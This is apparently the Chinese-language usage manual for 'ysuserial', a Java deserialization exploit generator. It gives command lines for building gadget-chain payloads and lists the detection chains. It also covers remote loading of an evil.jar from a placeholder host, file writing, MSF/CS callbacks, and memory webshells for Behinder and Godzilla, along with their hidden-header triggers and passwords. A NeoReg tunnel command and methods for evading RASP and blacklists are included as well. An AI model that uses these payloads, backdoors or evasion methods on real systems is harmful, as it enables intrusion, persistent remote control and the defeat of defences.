任意⾃定义代码
如果你不想使⽤本项⽬中提供的恶意逻辑，也不想执⾏命令，可以通过⾃定义代码的形式，⾃定义代码将会在⽬标服务器通过
ClassLoader 进⾏加载并实例化。命令使⽤ LF-  开头，后⾯跟指定⾃定义类字节码⽂件的绝对路径。
示例：
效果图：
普通命令执⾏
最后是普通的执⾏命令，直接输⼊待执⾏的命令即可，程序将会使⽤ Unsafe 反射调⽤ forkAndExec 执⾏系统命令。
普通命令执⾏示例：
效果图：
java -jar ysuserial-0.1-su18-all.jar CommonsCollections3 LF-/tmp/evil.class
java -jar ysuserial-0.1-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
DNSLOG 关键字
对应链
关键类
备注
cc31or321
cc322
CommonsCollections13567
org.apache.commons.collections.functors.ChainedTransformer
org.apache.commons.collections.ExtendedProperties$1
CommonsCollections1/3/5/6/7
需要"/3.2.1版本
cc40
cc41
CommonsCollections24
org.apache.commons.collections4.functors.ChainedTransformer
org.apache.commons.collections4.FluentIterable
CommonsCollections2/4链
需要4-4.0版本
cb17
cb18x
cb19x
CommonsBeanutils2
org.apache.commons.beanutils.MappedPropertyDescriptor$1
org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry
org.apache.commons.beanutils.BeanIntrospectionData
1.7x-1.8x
为-3490850999041592962
1.9x为-2044202215314119608
c3p092x
c3p095x
C3P0
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase
com.mchange.v2.c3p0.test.AlwaysFailDataSource
0.9.2pre2-0.9.5pre8为
7387108436934414104
0.9.5pre9-0.9.5.5为
7387108436934414104
ajw
AspectJWeaver
org.aspectj.weaver.tools.cache.SimpleCache
AspectJWeaver,需要cc31
bsh20b4
bsh20b5
bsh20b6
bsh
bsh.CollectionManager$1
bsh.engine.BshScriptEngine
bsh.collection.CollectionIterator$1
2.0b4为4949939576606791809
2.0b5为4041428789013517368
2.0.b6⽆法反序列化
groovy1702311
groovy24x
groovy244
Groovy
org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet
groovy.lang.Tuple2
org.codehaus.groovy.runtime.dgm$1170
2.4.x为-8137949907733646644
2.3.x为1228988487386910280
becl
Becl
com.sun.org.apache.bcel.internal.util.ClassLoader
JDK<8u251
Jdk7u21
Jdk7u21
com.sun.corba.se.impl.orbutil.ORBClassLoader
JDK"/7u21
JRE8u20
JRE8u20
javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1
7u25"/JDK"/8u20
这个检测不完美,8u25版本以及
JDK"/7u21会误报
可综合Jdk7u21来看
linux
windows
winlinux
sun.awt.X11.AwtGraphicsConfigData
sun.awt.windows.WButtonPeer
windows/linux版本判断
all
全部检测
URLDNS 探测⽬标类
为了解决有反序列化利⽤点但是⽆链可⽤的状态，本项⽬提供了基于 URLDNS 探测⽬标类的功能。这条链会根据⽬标环境中不同的类是否
存在来判断系统环境、依赖版本，主要包含如下表格中的内容：
示例：
效果图：
其他利⽤链的拓展
对于 BeanShell1 及 Clojure 这两个基于脚本语⾔解析的漏利⽤⽅式。
本项⽬为这两条利⽤链拓展了除了 Runtime 执⾏命令意外的多种利⽤⽅式，具体如下：
TS ：Thread Sleep - 通过 Thread.sleep()  的⽅式来检查是否存在反序列化漏洞，使⽤命令： TS-10
RC ：Remote Call - 通过 URLClassLoader.loadClass()  来调⽤远程恶意类并初始化，使⽤命令： RC-
http:"+xxxx.com/evil.jar#EvilClass
WF ：Write File - 通过 FileOutputStream.write()  来写⼊⽂件，使⽤命令： WF-/tmp/shell#123
其他：普通命令执⾏ - 通过 ProcessBuilder().start()  执⾏系统命令，使⽤命令 whoami
与之前的扩展类似，这⾥也不放截图了。
MSF/CS 上线
使⽤ MSF 的上线载荷配合远程 Jar 包调⽤完成 MSF 上线，后续可转 CS。
示例：
java -jar ysuserial-0.1-su18-all.jar URLDNS 'xxxxxx.dns.log'
内存⻢的使⽤
针对项⽬中⼀键打⼊的各种内存⻢，这⾥提供了通⽤的利⽤⽅式。
命令执⾏及后⻔类
对于 SpringInterceptorMS、TFMSFromJMX、TFMSFromThread、TLMSFromJMX、TLMSFromThread、TSMSFromJMX、
TSMSFromThread 注⼊内存⻢的利⽤⽅式，此类内存⻢都同时集成了三种功能：命令执⾏及回显、冰蝎、哥斯拉。
⾸先为了隐藏内存⻢，通过逻辑进⾏了判断，需要在请求 Header 中添加 Referer: https:"+su18.org/ 。
其次将根据 header 中的 X-SSRF-TOKEN  的值执⾏不同的逻辑：
1. 如果 X-SSRF-TOKEN  的值是 ce，则为 命令执⾏ 功能，程序会从 X-Token-Data  中读取待执⾏的命令，并将执⾏结果进⾏
回显； 
2. 如果 X-SSRF-TOKEN  的值是 bx，则为 冰蝎 Shell 功能，可使⽤冰蝎客户端进⾏连接管理，密码 su18yyds ；
3. 如果 X-SSRF-TOKEN  的值是 gz，则为 哥斯拉 shell 功能，可使⽤哥斯拉客户端进⾏连接管理，pass 值设为 su18 ，key
设为 su18yyds 。
NeoReg 隧道类
对于 TLNeoRegFromThread 注⼊ NeoReg 的隧道脚本。项⽬地址：https:"+github.com/L-codes/Neo-reGeorg
可以使⽤类似如下命令建⽴隧道连接：
效果图：
TomcatEcho
python neoreg.py -k su18 -u http:"+xxx.com/ -H 'Referer: https:"+su18.org/'
对于 TomcatEcho 是基于在线程组中找到带有指定 Header 头部的请求、执⾏命令并回显的利⽤⽅式。
使⽤时在 Header 中加⼊ X-Token-Data  ，其值为待执⾏的命令，命令执⾏结果将回显在 response 中。
效果图：
防御的绕过
这部分不涉及使⽤⽅式，只是简单的描述⼀下项⽬中所使⽤的绕过⽅式供⼤家了解。
流量层⾯
对于冰蝎和哥斯拉，他们⾃⼰在流量和Java层都有很多可以提取的特征，这⾥没有办法去管控，需要各位⾃⾏去魔改，其实也并不难。本
项⽬把⼀些⼤家实现的⽐较类似的⼀些特征进⾏了去除。
RASP 层⾯
对于漏洞执⾏常使⽤的 Runtime、URLClassLoader 等，很多 RASP 都进⾏了 Hook，在攻击时可能会被拦截，这⾥我使⽤了⼀些反
射调⽤ native ⽅法之类的技术去尝试 RASP 的防御，具体的技术实现就不细说了，感兴趣的朋友可以反编译 jar 包查看相关代码。
这⾥由于发现还有的不讲武德的防御⽅式在类加载时进⾏包名的⿊名单的匹配，对例如 rebeyond/metasploit 之类的关键字进⾏了防
御，因此本项⽬只⽤了个⼈的域名前缀包名 org.su18 ，据我了解⽬前还没有⼈针对我这个包名进⾏防御，如果未来被加⼊了豪华⿊名
单⼤礼包，我会更新可以⽣成⾃定义包名的版本。
参考
本项⽬参考了若⼲其他项⽬，包括但不限于：
https:"+github.com/woodpecker-framework/ysoserial-for-woodpecker
https:"+github.com/Y4er/ysoserial
https:"+github.com/rapid7/metasploit-framework
https:"+github.com/L-codes/Neo-reGeorg
https:"+github.com/kezibei/Urldns/
有兴趣的伙伴可以⾃⾏查看。
更新
在可预⻅的未来内会更新如下功能，敬请期待：
加载 CS shellcode（还没学会）；
⽆⽂件落地 Agent 注⼊（还没学会）；
持续绕过各种防护（我是实验室⿊客，实战还没学会）。
或者你有什么其他的想法或需求，可以与我进⾏联系。
提问与交流
本项⽬全部利⽤链全部功能以及全部利⽤链都经过本⼈本地环境的完整测试。但考虑到实际环境复杂，在实际使⽤中还可能遇到各种各样
的问题，欢迎⼤家⼀起测试，提出 ISSUES。
如果在项⽬使⽤时遇到任何问题，欢迎添加微信 K_MnO4 （⾼锰酸钾） ，或邮件 PI:EMAIL 进⾏交流。
关于 Java 安全的任意问题也可以与我进⾏交流，欢迎进⼊ JavaSec 交流群进⾏交流。
防御与修复
在使⽤本项⽬⾃查后，发现可以进⾏攻击，下⼀步该如何对其进⾏防护与修复呢？
经过实际环境的验证，发现使⽤ RASP 技术可以最好的进⾏安全层⾯的防护，经过完整的测试后，本项⽬所使⽤的全部攻击技术都可以被
灵蜥 — 应⽤系统攻击⾃免疫平台 RASP 产品完美防护，欢迎⼤家联系电话 010-61943626 或邮件 PI:EMAIL 进⾏咨
询和了解。